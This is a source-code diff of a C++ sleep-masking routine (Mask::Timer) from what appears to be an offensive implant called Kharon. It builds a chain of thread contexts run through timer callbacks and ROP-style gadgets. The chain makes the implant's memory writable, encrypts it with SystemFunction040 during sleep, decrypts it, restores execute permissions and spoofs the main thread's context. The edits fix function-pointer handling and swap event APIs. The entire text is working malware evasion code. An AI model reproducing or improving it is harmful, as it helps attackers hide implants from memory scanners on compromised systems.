@@ -73,10 +73,10 @@ auto DECLFN Mask::Timer(
 
     BYTE Key[16] = { 0 };
 
-    KhDbg( "kharon base at %p [0x%X bytes]\n", Kh->Session.Base.Start, Kh->Session.Base.Length );
-    KhDbg( "running at thread id: %d thread id to duplicate: %d\n", Kh->Session.ThreadID, DupThreadId );
-    KhDbg( "NtContinue gadget at %p\n", Kh->Mk->Ctx.NtContinueGadget );
-    KhDbg( "gadget at %p\n", Kh->Mk->Ctx.JmpGadget );
+    KhDbg( "kharon base at %p [0x%X bytes]", Kh->Session.Base.Start, Kh->Session.Base.Length );
+    KhDbg( "running at thread id: %d thread id to duplicate: %d", Kh->Session.ThreadID, DupThreadId );
+    KhDbg( "NtContinue gadget at %p", Kh->Mk->Ctx.NtContinueGadget );
+    KhDbg( "jmp gadget at %p", Kh->Mk->Ctx.JmpGadget );
 
     DupThreadHandle = Kh->Td->Open( THREAD_ALL_ACCESS, FALSE, DupThreadId );
 
@@ -92,7 +92,7 @@ auto DECLFN Mask::Timer(
     NtStatus = Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Ntdll.RtlCaptureContext, &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
 
-    NtStatus = Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Ntdll.NtSetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
+    NtStatus = Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Krnl32.SetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
 
     NtStatus = Kh->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL ); 
@@ -108,26 +108,26 @@ auto DECLFN Mask::Timer(
     }
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtWaitForSingleObject );
+    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtWaitForSingleObject );
     Ctx[ic].Rcx = U_PTR( EventStart );
     Ctx[ic].Rdx = FALSE;
     Ctx[ic].R9  = NULL;
     ic++;
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtGetContextThread );
+    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtGetContextThread );
     Ctx[ic].Rcx = U_PTR( MainThreadHandle );
     Ctx[ic].Rdx = U_PTR( &CtxBkp );
     ic++;
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget ) ;
-    Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtSetContextThread ); 
+    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtSetContextThread ); 
     Ctx[ic].Rcx = U_PTR( MainThreadHandle );
     Ctx[ic].Rdx = U_PTR( &CtxSpf );
     ic++;
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Krnl32.VirtualProtect );
+    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.VirtualProtect );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
     Ctx[ic].R8  = PAGE_READWRITE;
@@ -135,26 +135,26 @@ auto DECLFN Mask::Timer(
     ic++;
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Cryptbase.SystemFunction040 );
+    Ctx[ic].Rbx = U_PTR( &Kh->Cryptbase.SystemFunction040 );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
     ic++;
     
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Krnl32.WaitForSingleObjectEx );
+    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.WaitForSingleObjectEx );
     Ctx[ic].Rcx = U_PTR( NtCurrentProcess() );
     Ctx[ic].Rdx = Time;
     Ctx[ic].R8  = FALSE;
     ic++;
         
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Cryptbase.SystemFunction041 );
+    Ctx[ic].Rbx = U_PTR( &Kh->Cryptbase.SystemFunction041 );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
     ic++;
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Krnl32.VirtualProtect );
+    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.VirtualProtect );
     Ctx[ic].Rcx = U_PTR( Kh->Session.Base.Start );
     Ctx[ic].Rdx = Kh->Session.Base.Length;
     Ctx[ic].R8  = PAGE_EXECUTE_READ;
@@ -162,19 +162,15 @@ auto DECLFN Mask::Timer(
     ic++;
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtSetContextThread );
+    Ctx[ic].Rbx = U_PTR( &Kh->Ntdll.NtSetContextThread );
     Ctx[ic].Rcx = U_PTR( MainThreadHandle );
     Ctx[ic].Rdx = U_PTR( &CtxBkp );
     ic++;
 
     Ctx[ic].Rip = U_PTR( Kh->Mk->Ctx.JmpGadget );
-    Ctx[ic].Rbx = U_PTR( Kh->Ntdll.NtSetEvent );
+    Ctx[ic].Rbx = U_PTR( &Kh->Krnl32.SetEvent );
     Ctx[ic].Rcx = U_PTR( EventEnd );
     ic++;
-
-    // for ( INT i = 0; i < 16; i++ ) {
-    //     Key[i] = (BYTE)Rnd32();
-    // }    
 
     for ( INT i = 0; i < ic; i++ ) {
         Kh->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Kh->Mk->Ctx.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
